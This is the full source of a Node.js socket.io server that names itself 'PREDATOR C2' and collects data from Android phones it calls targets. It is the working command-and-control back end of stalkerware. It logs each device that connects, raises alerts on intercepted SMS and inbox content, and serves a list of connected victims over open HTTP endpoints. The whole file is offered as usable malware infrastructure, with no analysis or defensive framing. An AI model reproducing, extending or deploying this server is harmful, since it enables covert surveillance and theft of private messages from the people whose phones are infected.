const http = require('http');
const server = http.createServer((req, res) => {
    // ✅ Status endpoint — for health checks
    if (req.url === '/status') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: "online",
            uptime: process.uptime(),
            connections: connectedDevices.size,
            timestamp: new Date().toISOString()
        }));
        return;
    }

    // ✅ Devices endpoint — list connected devices
    if (req.url === '/devices') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        const devices = [];
        connectedDevices.forEach((dev, id) => {
            const uptime = Math.round((Date.now() - dev.connectedAt) / 60000);
            devices.push({
                id: id,
                info: dev.info || 'Unknown',
                uptimeMinutes: uptime,
                connectedAt: new Date(dev.connectedAt).toISOString()
            });
        });
        res.end(JSON.stringify({ devices }));
        return;
    }

    res.writeHead(200);
    res.end("PREDATOR SYSTEM ACTIVE 🚀");
});

const io = require('socket.io')(server, {
    // Mobile networks are slow — give 60s before declaring dead
    pingTimeout: 60000,
    // Ping every 25s to keep NAT/firewall alive
    pingInterval: 25000,
    transports: ['websocket', 'polling'],
    cors: { origin: "*" },
    allowUpgrades: true,
    maxHttpBufferSize: 1e6,
});

// Track connected devices
const connectedDevices = new Map();

console.log("-----------------------------------------");
console.log("💀 PREDATOR C2: UNIVERSAL MONITORING 💀");
console.log("Status: Extreme Speed & Stability Active");
console.log("OEM Support: ALL Android Manufacturers");
console.log("-----------------------------------------");

io.on('connection', (socket) => {
    const connectTime = new Date().toLocaleTimeString();
    console.log(`\n[+] LIVE CONNECTION: ${socket.id} at ${connectTime}`);
    console.log(`    Transport: ${socket.conn.transport.name}`);

    // Track transport upgrades
    socket.conn.on('upgrade', (transport) => {
        console.log(`[↑] ${socket.id} upgraded to: ${transport.name}`);
    });

    socket.on("device_info", (info) => {
        console.log("📱 DEVICE IDENTIFIED: " + info);
        connectedDevices.set(socket.id, { info, connectedAt: Date.now() });
    });

    socket.on('phone_data', (packet) => {
        const time = new Date().toLocaleTimeString();

        if (packet.includes("SMS") || packet.includes("INBOX")) {
            console.log(`\n\n=========================================`);
            console.log(`[${time}] 🚨 ALERT: ${packet}`);
            console.log(`=========================================\n`);
        }
        else if (packet.includes("BATTERY")) {
            process.stdout.write(`\r[${time}] 🔋 STATUS: ${packet}          `);
        }
    });

    // Manual keepalive
    socket.on('ping_alive', () => {
        socket.emit('pong_alive');
    });

    // Error handling
    socket.on('error', (err) => {
        console.log(`[!] Socket error from ${socket.id}: ${err.message}`);
    });

    socket.on('disconnect', (reason) => {
        console.log(`\n[-] Target Offline: ${socket.id} (Reason: ${reason})`);
        connectedDevices.delete(socket.id);

        if (reason === 'transport close' || reason === 'transport error') {
            console.log(`    ⚠️ Network-level disconnect — client will auto-reconnect`);
        } else if (reason === 'ping timeout') {
            console.log(`    ⚠️ Ping timeout — client may be in deep sleep`);
        } else if (reason === 'client namespace disconnect') {
            console.log(`    ❌ Client intentionally disconnected`);
        }
    });
});

// Log connected clients every 60s
setInterval(() => {
    const count = connectedDevices.size;
    const time = new Date().toLocaleTimeString();
    if (count > 0) {
        console.log(`\n[${time}] 🟢 Active Connections: ${count}`);
        connectedDevices.forEach((dev, id) => {
            const uptime = Math.round((Date.now() - dev.connectedAt) / 60000);
            console.log(`    └─ ${id} | ${dev.info || 'Unknown'} | Uptime: ${uptime}min`);
        });
    } else {
        console.log(`\r[${time}] ⏳ Waiting for connections... (0 devices)          `);
    }
}, 60000);

// Start server
server.listen(3000, '0.0.0.0', () => {
    console.log("C2 Server running on Port 3000...");
    console.log("Status endpoint: http://localhost:3000/status");
    console.log("Devices endpoint: http://localhost:3000/devices");
});